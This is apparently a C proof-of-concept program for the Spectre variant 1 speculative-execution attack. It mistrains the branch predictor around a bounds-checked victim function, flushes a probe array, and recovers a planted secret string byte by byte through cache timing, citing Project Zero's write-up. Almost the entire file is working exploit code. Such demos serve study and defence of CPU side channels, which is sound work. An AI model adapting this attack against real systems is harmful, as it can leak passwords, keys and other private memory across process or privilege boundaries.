#include <emmintrin.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>

#include "../cache.h"

/// The buf_size is used in the victim function so it has to be a variable and
/// not a constant. So it can be evicted from the cache and won't be hardcoded
/// in asm
size_t victim_buf_size CACHE_LINE_ALIGNED = 16;
char victim_buf[16] CACHE_LINE_ALIGNED = {1, 2,  3,  4,  5,  6,  7,  8,
                                          9, 10, 11, 12, 13, 14, 15, 16};
char probe[256 * CACHE_LINE_SIZE] CACHE_LINE_ALIGNED;

char *secret = "The answer is 42";

char tmp = 0;
void noinline victim_function(size_t x) {
  if (x < victim_buf_size) {
    tmp &= probe[victim_buf[x] * CACHE_LINE_SIZE];
  }
}

size_t spectre_v1(size_t x_to_read) {
  size_t results[256] = {0};

  for (size_t try = 999; try > 0; try--) {
    /// Flush the probe array from the cache
    for (size_t i = 0; i < 256; i++) {
      _mm_clflush(&probe[i * CACHE_LINE_SIZE]);
    }

    /// We have to mistrain the branch predictor to speculatively access the
    /// secret data. So every 6th iteration x = x_to_read and the other times it
    /// will be the one used for training
    /// https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html
    ///   for details about how the branch prediction mechanism works
    size_t x;
    size_t train_x = try % victim_buf_size;
    for (int i = 29; i >= 0; i--) {
      _mm_clflush(&victim_buf_size);

      poors_man_mfence();

      x = ((i % 6) - 1) & ~0xFFFF;
      x = (x | (x >> 16));
      x = train_x ^ (x & (x_to_read ^ train_x));

      victim_function(x);
    }

    measure_cache(probe, results);
    int read = valid_read(results, 256);
    if (read != -1) {
      return read;
    }
  }

  return 0;
}

int main() {
  size_t secret_offset = secret - (char *)victim_buf;
  int len = strlen(secret);

  /// Write probe to RAM and put it in non COW pages
  for (int i = 0; i < sizeof(probe); i++) {
    probe[i] = 1;
  }

  for (int i = 0; i < len; i++) {
    printf("reading %d...", i);
    char value = spectre_v1(secret_offset + i);
    printf("0x%02X='%c'\n", value, (value > 31 && value < 127 ? value : '?'));
  }
  printf("\n");
  return 0;
}
